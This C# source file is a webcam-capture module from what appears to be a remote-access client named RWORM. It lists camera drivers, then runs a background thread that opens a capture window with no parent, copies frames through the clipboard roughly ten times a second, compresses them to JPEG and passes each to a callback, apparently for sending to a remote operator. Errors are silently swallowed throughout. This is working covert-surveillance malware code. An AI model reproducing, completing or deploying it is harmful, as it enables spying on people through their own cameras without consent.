using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using RWORM.Client.Core;

namespace RWORM.Client.Modules
{
    public class WebcamManager : IDisposable
    {
        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        private static extern IntPtr capCreateCaptureWindowA(
            string lpszWindowName,
            int dwStyle,
            int x,
            int y,
            int nWidth,
            int nHeight,
            IntPtr hWnd,
            int nID);

        [DllImport("avicap32.dll", EntryPoint = "capGetDriverDescriptionA")]
        private static extern bool capGetDriverDescriptionA(
            short wDriverIndex,
            [Out] byte[] lpszName,
            int cbName,
            [Out] byte[] lpszVer,
            int cbVer);

        [DllImport("user32.dll")]
        private static extern bool SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool DestroyWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll")]
        private static extern bool CloseClipboard();

        [DllImport("user32.dll")]
        private static extern IntPtr GetClipboardData(uint uFormat);

        private const uint WM_CAP_START = 0x0400;
        private const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
        private const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
        private const uint WM_CAP_EDIT_COPY = WM_CAP_START + 30;
        private const uint WM_CAP_SET_PREVIEWRATE = WM_CAP_START + 52;
        private const uint WM_CAP_SET_PREVIEW = WM_CAP_START + 50;

        private const int WS_CHILD = 0x40000000;
        private const uint CF_BITMAP = 2;

        private IntPtr _hCapWnd = IntPtr.Zero;
        private bool _running;
        private Thread? _worker;
        private int _driverIndex;
        private readonly Func<byte[], Task> _onFrame;

        public WebcamManager(int driverIndex, Func<byte[], Task> onFrame)
        {
            _driverIndex = driverIndex;
            _onFrame = onFrame;
        }

        public static byte[] GetDevicesJson()
        {
            var sb = new StringBuilder("[");
            bool first = true;

            for (short i = 0; i < 10; i++)
            {
                byte[] nameBuf = new byte[128];
                byte[] verBuf = new byte[128];
                if (capGetDriverDescriptionA(i, nameBuf, nameBuf.Length, verBuf, verBuf.Length))
                {
                    string name = Encoding.ASCII.GetString(nameBuf).TrimEnd('\0').Trim();
                    string ver = Encoding.ASCII.GetString(verBuf).TrimEnd('\0').Trim();
                    if (!string.IsNullOrEmpty(name))
                    {
                        if (!first) sb.Append(',');
                        first = false;
                        string escName = JsonHelper.Escape($"{name} ({ver})");
                        sb.Append($"{{\"index\":{i},\"name\":\"{escName}\"}}");
                    }
                }
            }

            sb.Append(']');
            return Encoding.UTF8.GetBytes(sb.ToString());
        }

        public void Start()
        {
            if (_running) return;
            _running = true;

            _worker = new Thread(() =>
            {
                try
                {
                    _hCapWnd = capCreateCaptureWindowA("WebcamCapture", WS_CHILD, 0, 0, 640, 480, IntPtr.Zero, 0);
                    if (_hCapWnd != IntPtr.Zero)
                    {
                        SendMessage(_hCapWnd, WM_CAP_DRIVER_CONNECT, (IntPtr)_driverIndex, IntPtr.Zero);
                        SendMessage(_hCapWnd, WM_CAP_SET_PREVIEWRATE, (IntPtr)66, IntPtr.Zero);
                        SendMessage(_hCapWnd, WM_CAP_SET_PREVIEW, (IntPtr)1, IntPtr.Zero);

                        while (_running)
                        {
                            SendMessage(_hCapWnd, WM_CAP_EDIT_COPY, IntPtr.Zero, IntPtr.Zero);
                            byte[]? jpegBytes = GetClipboardBitmapAsJpeg(50);
                            if (jpegBytes != null && jpegBytes.Length > 0)
                            {
                                try
                                {
                                    _onFrame(jpegBytes).Wait(300);
                                }
                                catch { }
                            }
                            Thread.Sleep(100);
                        }

                        SendMessage(_hCapWnd, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
                        DestroyWindow(_hCapWnd);
                        _hCapWnd = IntPtr.Zero;
                    }
                }
                catch { }
            });
            _worker.SetApartmentState(ApartmentState.STA);
            _worker.IsBackground = true;
            _worker.Start();
        }

        private static byte[]? GetClipboardBitmapAsJpeg(long quality)
        {
            try
            {
                if (!OpenClipboard(IntPtr.Zero)) return null;
                IntPtr hBitmap = GetClipboardData(CF_BITMAP);
                CloseClipboard();

                if (hBitmap == IntPtr.Zero) return null;

                using var bmp = Image.FromHbitmap(hBitmap);
                using var ms = new MemoryStream();

                ImageCodecInfo? jpegCodec = GetEncoder(ImageFormat.Jpeg);
                if (jpegCodec == null)
                {
                    bmp.Save(ms, ImageFormat.Jpeg);
                }
                else
                {
                    var encParams = new EncoderParameters(1);
                    encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                    bmp.Save(ms, jpegCodec, encParams);
                }
                return ms.ToArray();
            }
            catch
            {
                return null;
            }
        }

        private static ImageCodecInfo? GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                    return codec;
            }
            return null;
        }

        public void Stop()
        {
            _running = false;
            try
            {
                if (_worker != null && _worker.IsAlive)
                {
                    _worker.Join(1500);
                }
            }
            catch { }
        }

        public void Dispose() => Stop();
    }
}
